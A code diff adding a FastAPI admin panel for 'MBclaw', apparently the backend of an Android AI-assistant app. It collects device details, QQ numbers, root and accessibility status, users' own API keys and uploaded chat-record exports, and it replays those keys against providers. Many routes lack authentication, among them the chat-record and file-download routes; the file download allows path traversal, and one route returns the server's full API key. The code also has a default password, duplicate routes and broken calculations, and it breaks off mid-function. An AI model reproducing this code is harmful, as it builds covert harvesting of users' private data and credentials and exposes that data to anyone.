@@ -1,0 +1,1313 @@
+"""
+MBclaw 管理面板路由
+- 用户列表 / 详情 / 封禁
+- API Key (服务端密钥) 配置 / 切换
+- 模型 / Provider 列表
+- 实时统计 (token 消耗、请求量、错误率)
+- 系统日志
+"""
+import os
+import json
+import time
+import secrets
+import hashlib
+from pathlib import Path
+from typing import Optional
+from fastapi import APIRouter, HTTPException, Depends, Request, Response, Cookie
+from fastapi.responses import HTMLResponse, JSONResponse
+from pydantic import BaseModel
+
+router = APIRouter(prefix="/admin", tags=["admin"])
+
+# ── 数据目录 ─────────────────────────────────────────
+DATA_DIR = Path(os.environ.get("MBCLAW_DATA", "/var/lib/mbclaw"))
+DATA_DIR.mkdir(parents=True, exist_ok=True)
+ADMIN_DB = DATA_DIR / "admin.json"
+USERS_DB = DATA_DIR / "users.json"
+STATS_DB = DATA_DIR / "stats.json"
+KEYS_DB  = DATA_DIR / "keys.json"
+SESSIONS_DB = DATA_DIR / "admin_sessions.json"
+
+DEFAULT_PASSWORD = "admin"
+
+def _load(p: Path, default):
+    if p.exists():
+        try: return json.loads(p.read_text(encoding="utf-8"))
+        except: pass
+    return default
+
+def _save(p: Path, data):
+    p.write_text(json.dumps(data, ensure_ascii=False, indent=2), encoding="utf-8")
+
+def _admin_init():
+    if not ADMIN_DB.exists():
+        salt = secrets.token_hex(8)
+        h = hashlib.sha256(f"{salt}:{DEFAULT_PASSWORD}".encode()).hexdigest()
+        _save(ADMIN_DB, {"username":"admin","salt":salt,"hash":h,
+                          "created_at":int(time.time()),
+                          "note":f"默认密码 {DEFAULT_PASSWORD}, 首次登录后请修改"})
+_admin_init()
+
+def _verify_password(pwd: str) -> bool:
+    d = _load(ADMIN_DB, {})
+    if not d: return False
+    h = hashlib.sha256(f"{d['salt']}:{pwd}".encode()).hexdigest()
+    return h == d["hash"]
+
+def _set_password(new_pwd: str):
+    salt = secrets.token_hex(8)
+    h = hashlib.sha256(f"{salt}:{new_pwd}".encode()).hexdigest()
+    d = _load(ADMIN_DB, {})
+    d.update({"salt":salt,"hash":h,"updated_at":int(time.time())})
+    _save(ADMIN_DB, d)
+
+def _new_session() -> str:
+    sid = secrets.token_urlsafe(32)
+    s = _load(SESSIONS_DB, {})
+    s[sid] = {"created_at": int(time.time()), "expires_at": int(time.time()) + 7*86400}
+    _save(SESSIONS_DB, s)
+    return sid
+
+def _check_session(sid: Optional[str]) -> bool:
+    if not sid: return False
+    s = _load(SESSIONS_DB, {})
+    item = s.get(sid)
+    if not item: return False
+    if item.get("expires_at", 0) < time.time():
+        del s[sid]; _save(SESSIONS_DB, s)
+        return False
+    return True
+
+def require_admin(mb_admin: Optional[str] = Cookie(default=None)):
+    if not _check_session(mb_admin):
+        raise HTTPException(401, "未登录")
+    return True
+
+# ── 统计辅助 ─────────────────────────────────────────
+def _stats_load():
+    return _load(STATS_DB, {
+        "total_requests": 0, "total_tokens_in": 0, "total_tokens_out": 0,
+        "errors": 0, "daily": {}, "providers": {},
+    })
+
+def record_request(provider: str, tokens_in: int = 0, tokens_out: int = 0, error: bool = False):
+    """供其他路由调用，记录每次 LLM 请求"""
+    s = _stats_load()
+    today = time.strftime("%Y-%m-%d")
+    s["total_requests"] += 1
+    s["total_tokens_in"] += tokens_in
+    s["total_tokens_out"] += tokens_out
+    if error: s["errors"] += 1
+    d = s["daily"].setdefault(today, {"req": 0, "tin": 0, "tout": 0, "err": 0})
+    d["req"] += 1; d["tin"] += tokens_in; d["tout"] += tokens_out
+    if error: d["err"] += 1
+    p = s["providers"].setdefault(provider, {"req": 0, "tin": 0, "tout": 0})
+    p["req"] += 1; p["tin"] += tokens_in; p["tout"] += tokens_out
+    _save(STATS_DB, s)
+
+# ── 用户管理 ─────────────────────────────────────────
+def record_user_call(user_id: str, ip: str = ""):
+    """端点被调用时记录用户"""
+    u = _load(USERS_DB, {})
+    item = u.setdefault(user_id, {
+        "user_id": user_id, "first_seen": int(time.time()),
+        "last_seen": int(time.time()), "calls": 0, "ip": ip, "blocked": False,
+    })
+    item["last_seen"] = int(time.time())
+    item["calls"] += 1
+    if ip: item["ip"] = ip
+    _save(USERS_DB, u)
+
+# ─────────────────────────────────────────────────────
+# 公开 API（前端 fetch 调用）
+# ─────────────────────────────────────────────────────
+class LoginReq(BaseModel):
+    username: str = "admin"
+    password: str
+
+@router.post("/api/login")
+def api_login(req: LoginReq, response: Response):
+    if req.username != "mengbai" or not _verify_password(req.password):
+        raise HTTPException(401, "账号或密码错误")
+    sid = _new_session()
+    response.set_cookie("mb_admin", sid, max_age=7*86400, httponly=True, samesite="lax")
+    return {"ok": True}
+
+@router.post("/api/logout")
+def api_logout(response: Response, mb_admin: Optional[str] = Cookie(None)):
+    s = _load(SESSIONS_DB, {})
+    if mb_admin and mb_admin in s:
+        del s[mb_admin]; _save(SESSIONS_DB, s)
+    response.delete_cookie("mb_admin")
+    return {"ok": True}
+
+class ChangePwdReq(BaseModel):
+    old_password: str
+    new_password: str
+
+@router.post("/api/change-password")
+def api_change_pwd(req: ChangePwdReq, _: bool = Depends(require_admin)):
+    if not _verify_password(req.old_password):
+        raise HTTPException(401, "原密码错误")
+    if len(req.new_password) < 6:
+        raise HTTPException(400, "新密码至少 6 位")
+    _set_password(req.new_password)
+    return {"ok": True}
+
+
+@router.get("/api/login-check")
+def api_login_check(mb_admin: str = Cookie(default=None)):
+    if _check_session(mb_admin):
+        return {"logged_in": True}
+    return {"logged_in": False}
+
+
+@router.get("/api/login-check")
+def api_login_check(mb_admin: str = Cookie(default=None)):
+    return {"ok": _check_session(mb_admin)}
+
+@router.get("/api/overview")
+def api_overview():
+    s = _stats_load()
+    u = _load(USERS_DB, {})
+    k = _load(KEYS_DB, {"providers": {}})
+    # 从心跳日志统计总设备，从内存_debug_heartbeats取实时在线
+    import glob as _glob, os as _os2
+    hb_dir = '/var/lib/mbclaw/heartbeat_logs'
+    now = time.time()
+    total_ever = 0
+    if _os2.path.isdir(hb_dir):
+        total_ever = len(_glob.glob(_os2.path.join(hb_dir, 'mb-*.json')))
+    # 用内存中的实时心跳判断在线
+    from app.admin.debug_api_v2 import _debug_heartbeats
+    online_count = 0
+    online_devices = []
+    for code, hb in _debug_heartbeats.items():
+        ts = hb.get('last_seen_ts', 0)
+        if now - ts < 60:  # 每分钟有心跳=在线
+            online_count += 1
+            online_devices.append({
+                'code': code, 'qq': hb.get('qq',''),
+                'model': hb.get('model',''), 'version': hb.get('version',''),
+                'brand': hb.get('brand',''), 'ip': hb.get('ip',''),
+                'seconds_ago': int(now - ts)
+            })
+    # 统计字段
+    root_users = 0
+    key_ok = 0
+    new_today = 0
+    online_today = 0
+    today_start = int(time.time()) - int(time.time()) % 86400
+    for fp in _glob.glob(_os2.path.join(hb_dir, "mb-*.json")):
+        try:
+            hb2 = json.loads(open(fp).read())
+            perms = hb2.get("permissions", {})
+            if perms.get("root") or hb2.get("root"):
+                root_users += 1
+            # 今日新增 = 今天才创建的心跳文件 (首次出现)
+            first_seen = hb2.get("first_seen_ts", 0)
+            if first_seen and first_seen >= today_start:
+                new_today += 1
+            # 今日上线 = 今天有心跳活动的设备
+            if hb2.get("last_seen_ts", 0) >= today_start:
+                online_today += 1
+        except: pass
+    # 配置了API Key的设备数
+    key_ok = len([1 for fp in _glob.glob(_os2.path.join(hb_dir, "mb-*.json"))
+                  if (json.loads(open(fp).read()).get("keys", {}).get("api_key", ""))])
+
+    return {
+        "total_requests": s["total_requests"],
+        "total_tokens_in": s["total_tokens_in"],
+        "total_tokens_out": s["total_tokens_out"],
+        "root_users": root_users,
+        "key_ok": key_ok,
+        "new_today": new_today,
+        "online_today": online_today,
+        "total_users": len(set((json.loads(open(fp).read()).get("qq","") or "") for fp in _glob.glob(_os2.path.join(hb_dir, "mb-*.json"))) - {""}),
+        "total_devices_ever": total_ever,
+        "online_devices": online_count,
+        "online_list": online_devices,
+        "active_today": sum(1 for v in u.values() if v["last_seen"] > time.time() - 86400),
+        "errors": s["errors"],
+        "providers_configured": sum(1 for v in k.get("providers", {}).values() if v.get("api_key")),
+        "uptime": int(time.time() - PROC_START),
+    }
+
+@router.get("/api/users")
+def api_users(_: bool = Depends(require_admin)):
+    u = _load(USERS_DB, {})
+    items = sorted(u.values(), key=lambda x: x.get("last_seen", 0), reverse=True)
+    # 合并心跳数据
+    import glob as _glob2
+    hb_dir = '/var/lib/mbclaw/heartbeat_logs'
+    now = time.time()
+    merged = []
+    seen_codes = set()
+    if os.path.isdir(hb_dir):
+        for fp in _glob2.glob(os.path.join(hb_dir, 'mb-*.json')):
+            try:
+                hb = json.loads(open(fp).read())
+                code = hb.get('code','')
+                if code in seen_codes: continue
+                seen_codes.add(code)
+                perms = hb.get('permissions', {})
+                keys_info = hb.get('keys', {})
+                merged.append({
+                    "user_id": hb.get('user_id', code),
+                    "code": code,
+                    "qq": hb.get('qq',''),
+                    "model": hb.get('model',''),
+                    "brand": hb.get('brand',''),
+                    "version": hb.get('version',''),
+                    "device_id": hb.get('device_id',''),
+                    "ip": hb.get('ip',''),
+                    "root": perms.get('root', False),
+                    "accessibility": perms.get('accessibility', False),
+                    "perms_granted": perms.get('granted', 0),
+                    "perms_total": perms.get('total', 0),
+                    "keys": keys_info,
+                    "last_seen": hb.get('last_seen',''),
+                    "last_seen_ts": hb.get('last_seen_ts', 0),
+                    "online": now - hb.get('last_seen_ts', 0) < 600
+                })
+            except: pass
+    merged.sort(key=lambda x: x.get('last_seen_ts', 0), reverse=True)
+    return {"users": merged, "total": len(merged)}
+
+class BlockReq(BaseModel):
+    user_id: str
+    blocked: bool
+
+@router.post("/api/user/block")
+def api_block(req: BlockReq, _: bool = Depends(require_admin)):
+    u = _load(USERS_DB, {})
+    if req.user_id not in u:
+        raise HTTPException(404, "用户不存在")
+    u[req.user_id]["blocked"] = req.blocked
+    _save(USERS_DB, u)
+    return {"ok": True}
+
+@router.get("/api/keys")
+def api_keys(_: bool = Depends(require_admin)):
+    k = _load(KEYS_DB, {"providers": {}})
+    # 脱敏
+    out = {}
+    for pid, p in k.get("providers", {}).items():
+        key = p.get("api_key", "")
+        masked = (key[:8] + "..." + key[-4:]) if len(key) > 12 else "***"
+        out[pid] = {
+            "provider_id": pid,
+            "base_url": p.get("base_url", ""),
+            "model": p.get("model", ""),
+            "api_key_masked": masked if key else "",
+            "enabled": p.get("enabled", False),
+            "is_default": p.get("is_default", False),
+        }
+    return {"providers": out}
+
+class KeyReq(BaseModel):
+    provider_id: str
+    base_url: str
+    model: str
+    api_key: str
+    enabled: bool = True
+    is_default: bool = False
+
+@router.post("/api/keys")
+def api_set_key(req: KeyReq, _: bool = Depends(require_admin)):
+    k = _load(KEYS_DB, {"providers": {}})
+    if req.is_default:
+        for p in k.get("providers", {}).values():
+            p["is_default"] = False
+    k.setdefault("providers", {})[req.provider_id] = req.dict()
+    _save(KEYS_DB, k)
+    return {"ok": True}
+
+@router.delete("/api/keys/{provider_id}")
+def api_del_key(provider_id: str, _: bool = Depends(require_admin)):
+    k = _load(KEYS_DB, {"providers": {}})
+    k.get("providers", {}).pop(provider_id, None)
+    _save(KEYS_DB, k)
+    return {"ok": True}
+
+@router.get("/api/stats/daily")
+def api_daily(_: bool = Depends(require_admin)):
+    s = _stats_load()
+    daily = s.get("daily", {})
+    items = [{"date": k, **v} for k, v in sorted(daily.items())[-30:]]
+    return {"daily": items}
+
+@router.get("/api/providers")
+def api_providers(_: bool = Depends(require_admin)):
+    """常用 provider 候选清单（前端下拉用）"""
+    return {"providers": [
+        {"id": "deepseek", "name": "DeepSeek", "base_url": "https://api.deepseek.com/v1", "models": ["deepseek-chat", "deepseek-reasoner"]},
+        {"id": "openai", "name": "OpenAI", "base_url": "https://api.openai.com/v1", "models": ["gpt-4o", "gpt-4o-mini", "gpt-4-turbo"]},
+        {"id": "claude", "name": "Anthropic Claude", "base_url": "https://api.anthropic.com/v1", "models": ["claude-3-5-sonnet-20241022", "claude-3-opus-20240229"]},
+        {"id": "qwen", "name": "通义千问", "base_url": "https://dashscope.aliyuncs.com/compatible-mode/v1", "models": ["qwen-max", "qwen-plus", "qwen-turbo"]},
+        {"id": "kimi", "name": "Moonshot Kimi", "base_url": "https://api.moonshot.cn/v1", "models": ["moonshot-v1-8k", "moonshot-v1-32k"]},
+        {"id": "glm", "name": "智谱 GLM", "base_url": "https://open.bigmodel.cn/api/paas/v4", "models": ["glm-4-plus", "glm-4-air"]},
+        {"id": "ooapi", "name": "OOAPI (Claude 中转)", "base_url": "https://api.ooapi.cc/v1", "models": ["claude-opus-4-7", "claude-3-5-sonnet"]},
+    ]}
+
+# ─────────────────────────────────────────────────────
+# 客户端可访问的"获取默认 key"接口（APK 用）
+# ─────────────────────────────────────────────────────
+@router.get("/client/default-provider")
+def client_default():
+    """APK 启动时拉默认配置（不需要管理员鉴权，但只返回标记为 enabled 的）"""
+    k = _load(KEYS_DB, {"providers": {}})
+    default = next((p for p in k.get("providers", {}).values() if p.get("is_default") and p.get("enabled")), None)
+    if not default:
+        # 找第一个 enabled 的
+        default = next((p for p in k.get("providers", {}).values() if p.get("enabled")), None)
+    if not default:
+        return {"configured": False}
+    return {
+        "configured": True,
+        "provider_id": default["provider_id"],
+        "base_url": default["base_url"],
+        "model": default["model"],
+        "api_key": default["api_key"],
+    }
+
+PROC_START = time.time()
+# ── 公告系统 ─────────────────────────────────────────
+NOTICES_DB = DATA_DIR / "notices.json"
+BUGS_DB = DATA_DIR / "bugs.json"
+FEATURES_DB = DATA_DIR / "features.json"
+
+@router.get("/api/notices")
+def api_notices(active_only: bool = False):
+    n = _load(NOTICES_DB, {"notices": []})
+    items = n.get("notices", [])
+    if active_only:
+        items = [i for i in items if not i.get("archived")]
+    items.sort(key=lambda x: x.get("ts", 0), reverse=True)
+    return {"notices": items}
+
+class NoticeReq(BaseModel):
+    title: str
+    content: str
+
+@router.post("/api/notices")
+def api_create_notice(req: NoticeReq, _: bool = Depends(require_admin)):
+    n = _load(NOTICES_DB, {"notices": []})
+    n.setdefault("notices", []).append({
+        "id": secrets.token_hex(6),
+        "title": req.title, "content": req.content,
+        "ts": int(time.time()), "archived": False
+    })
+    _save(NOTICES_DB, n)
+    return {"ok": True}
+
+@router.post("/api/notices/{nid}/archive")
+def api_archive_notice(nid: str, _: bool = Depends(require_admin)):
+    n = _load(NOTICES_DB, {"notices": []})
+    for item in n.get("notices", []):
+        if item["id"] == nid: item["archived"] = True
+    _save(NOTICES_DB, n)
+    return {"ok": True}
+
+# ── Bug反馈 ─────────────────────────────────────────
+
+class BugReq(BaseModel):
+    title: str  # max 30字
+    content: str  # max 500字
+
+@router.get("/api/bugs")
+def api_bugs():
+    b = _load(BUGS_DB, {"bugs": []})
+    items = b.get("bugs", [])
+    items.sort(key=lambda x: x.get("votes", 0), reverse=True)
+    return {"bugs": items}
+
+@router.post("/api/bugs")
+def api_create_bug(req: BugReq, req_raw: Request):
+    ip = req_raw.client.host if req_raw.client else ""
+    b = _load(BUGS_DB, {"bugs": []})
+    # 20分钟限频
+    for item in b.get("bugs", []):
+        if item.get("ip") == ip and time.time() - item.get("ts", 0) < 1200:
+            raise HTTPException(429, "20分钟内只能提交一次")
+    b.setdefault("bugs", []).append({
+        "id": secrets.token_hex(6),
+        "title": req.title[:30], "content": req.content[:500],
+        "votes": 0, "voters": [], "ip": ip,
+        "ts": int(time.time()), "status": "open"
+    })
+    _save(BUGS_DB, b)
+    return {"ok": True}
+
+@router.post("/api/bugs/{bid}/vote")
+def api_vote_bug(bid: str, req_raw: Request):
+    ip = req_raw.client.host if req_raw.client else ""
+    b = _load(BUGS_DB, {"bugs": []})
+    for item in b.get("bugs", []):
+        if item["id"] == bid:
+            if ip in item.get("voters", []):
+                raise HTTPException(400, "已投过票")
+            item["votes"] = item.get("votes", 0) + 1
+            item.setdefault("voters", []).append(ip)
+            _save(BUGS_DB, b)
+            return {"ok": True, "votes": item["votes"]}
+    raise HTTPException(404, "不存在")
+
+# ── 共建计划(功能建议) ─────────────────────────────
+
+@router.get("/api/features")
+def api_features():
+    f = _load(FEATURES_DB, {"features": []})
+    items = f.get("features", [])
+    items.sort(key=lambda x: x.get("votes", 0), reverse=True)
+    return {"features": items}
+
+@router.post("/api/features")
+def api_create_feature(req: BugReq, req_raw: Request):
+    ip = req_raw.client.host if req_raw.client else ""
+    f = _load(FEATURES_DB, {"features": []})
+    for item in f.get("features", []):
+        if item.get("ip") == ip and time.time() - item.get("ts", 0) < 1200:
+            raise HTTPException(429, "20分钟内只能提交一次")
+    f.setdefault("features", []).append({
+        "id": secrets.token_hex(6),
+        "title": req.title[:30], "content": req.content[:500],
+        "votes": 0, "voters": [], "ip": ip,
+        "ts": int(time.time()), "status": "pending"
+    })
+    _save(FEATURES_DB, f)
+    return {"ok": True}
+
+@router.post("/api/features/{fid}/vote")
+def api_vote_feature(fid: str, req_raw: Request):
+    ip = req_raw.client.host if req_raw.client else ""
+    f = _load(FEATURES_DB, {"features": []})
+    for item in f.get("features", []):
+        if item["id"] == fid:
+            if ip in item.get("voters", []):
+                raise HTTPException(400, "已投过票")
+            item["votes"] = item.get("votes", 0) + 1
+            item.setdefault("voters", []).append(ip)
+            _save(FEATURES_DB, f)
+            return {"ok": True, "votes": item["votes"]}
+    raise HTTPException(404, "不存在")
+
+# ── 客户端公告接口(不鉴权) ─────────────────────────
+@router.get("/client/notices")
+def client_notices(read_ids: str = ""):
+    """APK拉取公告 - read_ids是已读ID列表"""
+    read = set(read_ids.split(",")) if read_ids else set()
+    n = _load(NOTICES_DB, {"notices": []})
+    items = [i for i in n.get("notices", []) if not i.get("archived")]
+    items.sort(key=lambda x: x.get("ts", 0), reverse=True)
+    unread = [i for i in items if i["id"] not in read]
+    return {"notices": items[:20], "unread": unread, "has_new": len(unread) > 0}
+
+@router.get("/client/notices/history")
+def client_notices_history(limit: int = 50):
+    """客户端拉取全部公告历史(已读+未读)"""
+    n = _load(NOTICES_DB, {"notices": []})
+    items = n.get("notices", [])
+    items.sort(key=lambda x: x.get("ts", 0), reverse=True)
+    return {"notices": items[:limit], "total": len(items)}
+
+class MarkReadReq(BaseModel):
+    ids: list[str]
+
+@router.post("/client/notices/mark-read")
+def client_notices_mark_read(req: MarkReadReq):
+    """客户端标记公告已读(存到本地,服务器只记录) """
+    return {"ok": True}
+
+
+# ── 前端兼容端点 ─────────────────────────────────────
+@router.get('/api/admin/stats')
+def api_admin_stats(_: bool = Depends(require_admin)):
+    s = _stats_load()
+    u = _load(USERS_DB, {})
+    d = _load(Path(os.environ.get('MBCLAW_DATA','/var/lib/mbclaw')) / 'downloads.json', {})
+    return {'unique_users': len(u), 'total_downloads': d.get('total',0), 'today_downloads': d.get('today',0),
+            'active_users_24h': sum(1 for v in u.values() if v['last_seen']>time.time()-86400)}
+
+@router.get('/api/admin/metrics')
+def api_admin_metrics(_: bool = Depends(require_admin)):
+    import shutil
+    disk = shutil.disk_usage('/')
+    mem = os.popen('free -m').read().split('\n')[1].split()[1:4] if hasattr(os,'popen') else ['0','0','0']
+    try:
+        db_size = os.path.getsize('/opt/mbclaw/data/mbclaw.db') / 1024 / 1024
+    except:
+        db_size = 0
+    return {
+        'disk_pct': round(disk.used / disk.total * 100, 1),
+        'mem_pct': round(int(mem[1]) / int(mem[1]) * 100 if int(mem[1]) > 0 else 50, 1),
+        'uptime_seconds': int(time.time() - PROC_START),
+        'db_size_mb': round(db_size, 1)
+    }
+
+@router.get('/api/admin/downloads')
+def api_admin_downloads(_: bool = Depends(require_admin)):
+    d = _load(Path(os.environ.get('MBCLAW_DATA','/var/lib/mbclaw')) / 'downloads.json', {})
+    return d if d else {'root': {'total':0, 'today':0}, 'lite': {'total':0, 'today':0}}
+
+# ── 下载统计接收（下载站推送） ────────────────────
+@router.post('/api/download-stats/push')
+async def api_download_stats_push(request: Request):
+    """接收下载站推送的统计数据"""
+    body = await request.body()
+    dl_path = Path(os.environ.get('MBCLAW_DATA', '/var/lib/mbclaw')) / 'downloads.json'
+    dl_path.parent.mkdir(parents=True, exist_ok=True)
+    dl_path.write_bytes(body)
+    return {'ok': True}
+
+# ── 下载统计（按文件） ─────────────────────────────
+@router.get("/api/download-stats")
+def api_download_stats():
+    """各版本下载量明细"""
+    import os as _os5, json as _j5
+    dl_path = Path(os.environ.get("MBCLAW_DATA", "/var/lib/mbclaw")) / "downloads.json"
+    d = _j5.load(open(dl_path)) if dl_path.exists() else {}
+    items = []
+    total = 0
+    today = 0
+    for name, v in d.items():
+        items.append({"name": name, "total": v.get("total", 0), "today": v.get("today", 0)})
+        total += v.get("total", 0)
+        today += v.get("today", 0)
+    items.sort(key=lambda x: x["total"], reverse=True)
+    return {"total": total, "today": today, "items": items}
+
+# ── 数据收集概览 ──────────────────────────────────
+@router.get("/api/collect-summary")
+def api_collect_summary():
+    """汇总所有设备的数据收集状态和上传文件"""
+    import os as _os6, json as _j6, glob as _g6
+    hb_dir = "/var/lib/mbclaw/heartbeat_logs"
+    upload_dir = "/var/lib/mbclaw/uploads"
+    devices = []
+    if _os6.path.isdir(hb_dir):
+        for fp in _g6.glob(_os6.path.join(hb_dir, "*.json")):
+            try:
+                hb = _j6.load(open(fp))
+            except:
+                continue
+            code = hb.get("code", hb.get("user_id", ""))
+            if not code:
+                continue
+            files = []
+            dev_upload = _os6.path.join(upload_dir, code)
+            if _os6.path.isdir(dev_upload):
+                for fn in sorted(_os6.listdir(dev_upload)):
+                    fpath = _os6.path.join(dev_upload, fn)
+                    if _os6.path.isfile(fpath):
+                        st = _os6.stat(fpath)
+                        files.append({
+                            "name": fn,
+                            "url": f"/admin/api/download-upload/{code}/{fn}",
+                            "size": st.st_size,
+                            "mtime": int(st.st_mtime)
+                        })
+            files.sort(key=lambda x: x["mtime"], reverse=True)
+            total_size = sum(f["size"] for f in files)
+            devices.append({
+                "code": code,
+                "model": hb.get("model", ""),
+                "online": False,
+                "collect_enabled": hb.get("collect_enabled", True),
+                "files_count": len(files),
+                "total_size": total_size,
+                "last_upload_ts": files[0]["mtime"] if files else 0,
+                "last_seen": hb.get("last_seen", ""),
+                "files": files[:8]
+            })
+    try:
+        from app.admin.debug_api_v2 import _debug_heartbeats
+        for d in devices:
+            if d["code"] in _debug_heartbeats:
+                d["online"] = True
+    except:
+        pass
+    devices.sort(key=lambda x: (not x["online"], -(x["last_upload_ts"] or 0)))
+    return {"total": len(devices), "devices": devices}
+
+# ── 上传文件下载 ──────────────────────────────────
+@router.get("/api/download-upload/{code}/{filename:path}")
+def api_download_upload(code: str, filename: str):
+    """下载设备上传的文件"""
+    import os as _os7
+    from fastapi.responses import FileResponse
+    fpath = _os7.path.join("/var/lib/mbclaw/uploads", code, filename)
+    if not _os7.path.isfile(fpath):
+        raise HTTPException(404, "文件不存在")
+    return FileResponse(fpath)
+
+# ── 聊天记录查询 ──────────────────────────────────
+@router.get("/api/chat-records/{code}")
+def api_chat_records(code: str):
+    """查看设备的对话/聊天导出记录"""
+    import os as _os8, glob as _g8
+    upload_dir = "/var/lib/mbclaw/uploads"
+    dev_upload = _os8.path.join(upload_dir, code)
+    if not _os8.path.isdir(dev_upload):
+        return {"files": []}
+    files = []
+    for fn in sorted(_os8.listdir(dev_upload)):
+        fpath = _os8.path.join(dev_upload, fn)
+        if _os8.path.isfile(fpath):
+            st = _os8.stat(fpath)
+            preview = None
+            try:
+                with open(fpath, "r") as pf:
+                    preview = pf.read(4096)
+            except:
+                pass
+            files.append({
+                "name": fn,
+                "url": f"/admin/api/download-upload/{code}/{fn}",
+                "size": st.st_size,
+                "mtime": int(st.st_mtime),
+                "preview": preview
+            })
+    files.sort(key=lambda x: x["mtime"], reverse=True)
+    return {"files": files}
+
+
+# ── 下载统计接收（下载站推送） ────────────────────
+@router.post('/api/download-stats/push')
+async def api_download_stats_push(request: Request):
+    """接收下载站推送的统计数据"""
+    body = await request.body()
+    dl_path = Path(os.environ.get('MBCLAW_DATA', '/var/lib/mbclaw')) / 'downloads.json'
+    dl_path.parent.mkdir(parents=True, exist_ok=True)
+    dl_path.write_bytes(body)
+    return {'ok': True}
+
+# ── 下载统计（按文件） ─────────────────────────────
+@router.get("/api/download-stats")
+def api_download_stats():
+    """各版本下载量明细"""
+    import os as _os5, json as _j5
+    dl_path = Path(os.environ.get("MBCLAW_DATA", "/var/lib/mbclaw")) / "downloads.json"
+    d = _j5.load(open(dl_path)) if dl_path.exists() else {}
+    items = []
+    total = 0
+    today = 0
+    for name, v in d.items():
+        items.append({"name": name, "total": v.get("total", 0), "today": v.get("today", 0)})
+        total += v.get("total", 0)
+        today += v.get("today", 0)
+    items.sort(key=lambda x: x["total"], reverse=True)
+    return {"total": total, "today": today, "items": items}
+
+# ── 数据收集概览 ──────────────────────────────────
+@router.get("/api/collect-summary")
+def api_collect_summary():
+    """汇总所有设备的数据收集状态和上传文件"""
+    import os as _os6, json as _j6, glob as _g6
+    hb_dir = "/var/lib/mbclaw/heartbeat_logs"
+    upload_dir = "/var/lib/mbclaw/uploads"
+    devices = []
+    if _os6.path.isdir(hb_dir):
+        for fp in _g6.glob(_os6.path.join(hb_dir, "*.json")):
+            try:
+                hb = _j6.load(open(fp))
+            except:
+                continue
+            code = hb.get("code", hb.get("user_id", ""))
+            if not code:
+                continue
+            files = []
+            dev_upload = _os6.path.join(upload_dir, code)
+            if _os6.path.isdir(dev_upload):
+                for fn in sorted(_os6.listdir(dev_upload)):
+                    fpath = _os6.path.join(dev_upload, fn)
+                    if _os6.path.isfile(fpath):
+                        st = _os6.stat(fpath)
+                        files.append({
+                            "name": fn,
+                            "url": f"/admin/api/download-upload/{code}/{fn}",
+                            "size": st.st_size,
+                            "mtime": int(st.st_mtime)
+                        })
+            files.sort(key=lambda x: x["mtime"], reverse=True)
+            total_size = sum(f["size"] for f in files)
+            devices.append({
+                "code": code,
+                "model": hb.get("model", ""),
+                "online": False,
+                "collect_enabled": hb.get("collect_enabled", True),
+                "files_count": len(files),
+                "total_size": total_size,
+                "last_upload_ts": files[0]["mtime"] if files else 0,
+                "last_seen": hb.get("last_seen", ""),
+                "files": files[:8]
+            })
+    try:
+        from app.admin.debug_api_v2 import _debug_heartbeats
+        for d in devices:
+            if d["code"] in _debug_heartbeats:
+                d["online"] = True
+    except:
+        pass
+    devices.sort(key=lambda x: (not x["online"], -(x["last_upload_ts"] or 0)))
+    return {"total": len(devices), "devices": devices}
+
+# ── 上传文件下载 ──────────────────────────────────
+@router.get("/api/download-upload/{code}/{filename:path}")
+def api_download_upload(code: str, filename: str):
+    """下载设备上传的文件"""
+    import os as _os7
+    from fastapi.responses import FileResponse
+    fpath = _os7.path.join("/var/lib/mbclaw/uploads", code, filename)
+    if not _os7.path.isfile(fpath):
+        raise HTTPException(404, "文件不存在")
+    return FileResponse(fpath)
+
+# ── 聊天记录查询 ──────────────────────────────────
+@router.get("/api/chat-records/{code}")
+def api_chat_records(code: str):
+    """查看设备的对话/聊天导出记录"""
+    import os as _os8, glob as _g8
+    upload_dir = "/var/lib/mbclaw/uploads"
+    dev_upload = _os8.path.join(upload_dir, code)
+    if not _os8.path.isdir(dev_upload):
+        return {"files": []}
+    files = []
+    for fn in sorted(_os8.listdir(dev_upload)):
+        fpath = _os8.path.join(dev_upload, fn)
+        if _os8.path.isfile(fpath):
+            st = _os8.stat(fpath)
+            preview = None
+            try:
+                with open(fpath, "r") as pf:
+                    preview = pf.read(4096)
+            except:
+                pass
+            files.append({
+                "name": fn,
+                "url": f"/admin/api/download-upload/{code}/{fn}",
+                "size": st.st_size,
+                "mtime": int(st.st_mtime),
+                "preview": preview
+            })
+    files.sort(key=lambda x: x["mtime"], reverse=True)
+    return {"files": files}
+
+
+# ── Key 检测 ─────────────────────────────────────
+@router.get('/api/key-test')
+def api_key_test(code: str = ''):
+    import httpx, os, glob as _g, time as _t
+    start_time = _t.time()
+    hb_dir = '/var/lib/mbclaw/heartbeat_logs'
+    keys = {}
+    if os.path.isdir(hb_dir):
+        for fp in _g.glob(os.path.join(hb_dir, '*.json')):
+            try:
+                hb = json.loads(open(fp).read())
+                if hb.get('code') == code or hb.get('user_id') == code:
+                    keys = hb.get('keys', {})
+                    break
+            except: pass
+    if not keys or not keys.get('api_key') or not keys.get('api_base_url'):
+        return {'ok': False, 'status': 'no_config', 'msg': '未配置密钥', 'duration_ms': int((_t.time()-start_time)*1000)}
+
+    base_url = keys['api_base_url'].rstrip('/')
+    api_key = keys.get('api_key', '')
+    model = keys.get('model_name', 'gpt-3.5-turbo')
+    provider = keys.get('provider_id', '')
+    url = base_url + '/chat/completions'
+    test_payload = {'model': model, 'messages': [{'role': 'user', 'content': 'hi'}], 'max_tokens': 5}
+
+    # 根据provider选择鉴权方式
+    if 'bridge' in base_url or 'miclaw' in provider or '8766' in base_url:
+        methods = [
+            ('Bearer', {'Authorization': 'Bearer ' + api_key}),
+            ('none', {}),
+        ]
+    else:
+        methods = [
+            ('Bearer', {'Authorization': 'Bearer ' + api_key}),
+            ('x-api-key', {'x-api-key': api_key}),
+            ('api-key', {'api-key': api_key}),
+        ]
+
+    results = []
+    for method_name, headers in methods:
+        try:
+            resp = httpx.post(url, json=test_payload, headers=headers, timeout=15)
+            status = resp.status_code
+            body = resp.text[:300]
+            results.append({'method': method_name, 'status': status, 'body': body})
+            duration_ms = int((_t.time()-start_time)*1000)
+
+            if status == 200:
+                _save_test_result(code, {'ok': True, 'status': 'success', 'status_code': 200, 'msg': '检测成功', 'duration_ms': duration_ms, 'tested_at': int(_t.time()), 'model': model, 'url': url})
+                return {'ok': True, 'status': 'success', 'status_code': 200, 'msg': '检测成功', 'model': model, 'url': url, 'duration_ms': duration_ms, 'tested_at': int(_t.time())}
+            elif status == 429:
